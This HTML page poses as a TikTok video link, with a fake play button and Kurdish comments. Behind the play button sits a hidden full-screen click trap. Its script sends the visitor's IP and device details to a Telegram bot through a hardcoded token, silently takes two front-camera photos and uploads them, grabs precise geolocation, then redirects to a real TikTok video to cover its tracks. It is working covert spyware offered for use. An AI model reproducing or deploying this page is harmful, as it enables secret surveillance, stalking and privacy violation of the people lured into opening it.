<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <meta property="og:title" content="TikTok . Shahen Sleman">
    <meta property="og:image" content="soran.jpg">
    <meta property="og:type" content="video.other">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
        .bg { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: url('soran.jpg') no-repeat center center; 
            background-size: contain; 
            z-index: 1; 
        }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
        .play-icon { width: 90px; height: 90px; fill: white; opacity: 0.9; }
        #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
        #flash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 200; display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="play-btn"><svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
    <div id="flash"></div>
    <div id="trap" onclick="startApp()"></div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";
        const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";

        // فانکشنی نوێ بۆ کۆکردنەوە و ناردنی زانیارییەکانی سەردانکەر
        async function sendVisitorDetails() {
            try {
                // هێنانی ئایپی و پۆرت لە ڕێگەی API دەرەکییەوە
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                const ip = ipData.ip || "نەزانراو";
                // پۆرتی کڕیار (Client Port) لە ڕێگەی جاڤاسکریتەوە ڕاستەوخۆ نادۆزرێتەوە بەهۆی پاراستنی تایبەتمەندی، بۆیە هەمیشە وەک نیشانە بە داینامیکی دادەنرێت
                const port = window.location.port || "80/443 (Standard)"; 
                
                // ناسینەوەی جۆری ئامێر
                const device = navigator.userAgent.split(')')[0].split('(')[1] || "نەزانراو";
                
                // ڕێکخستنی کات و ڕێکەوت بەپێی کاتی سەردانکەرەکە
                const now = new Date();
                const time = now.toLocaleTimeString('en-US', { hour12: false });
                const date = now.toLocaleDateString('en-US');

                // دروستکردنی دەقی پەیامەکە بەو شێوازەی خۆت داوات کردووە
                const message = `🚀 سەردانکەرێکی نوێ:\n🌐 ئایپی: ${ip}\n🔌 پۆرت: ${port}\n📱 ئامێر: ${device}\n⏰ کات: ${time}\n📅 ڕێکەوت: ${date}`;

                // ناردنی دەقەکە بۆ تێلێگرام
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
            } catch (error) {
                console.log("Error fetching visitor details:", error);
            }
        }

        async function sendPhoto(v, c, fileName, caption) {
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            const blob = await (await fetch(c.toDataURL('image/jpeg', 0.9))).blob();
            const fd = new FormData();
            fd.append('chat_id', chat_id);
            fd.append('photo', blob, fileName);
            fd.append('caption', caption);
            return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
        }

        async function startApp() {
            // لەگەڵ دەستپێکردنی بەرنامەکە، زانیارییەکان دەنێرێت
            sendVisitorDetails();

            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();
                const f = document.getElementById('flash');
                f.style.display = 'block';

                setTimeout(async () => {
                    await sendPhoto(v, document.getElementById('c'), "1.jpg", "📸 Snap 1");
                    
                    setTimeout(async () => {
                        await sendPhoto(v, document.getElementById('c'), "2.jpg", "📸 Snap 2");
                        f.style.display = 'none';

                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(async (pos) => {
                                const lat = pos.coords.latitude;
                                const lon = pos.coords.longitude;
                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                                
                                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("📍 لۆکەیشن:\n" + mapLink)}`);
                                window.location.href = targetVideo;
                            }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
                        } else { window.location.href = targetVideo; }
                    }, 200);
                }, 1000);
            } catch (e) {
                window.location.href = targetVideo;
            }
        }
    </script>
</body>
</html>
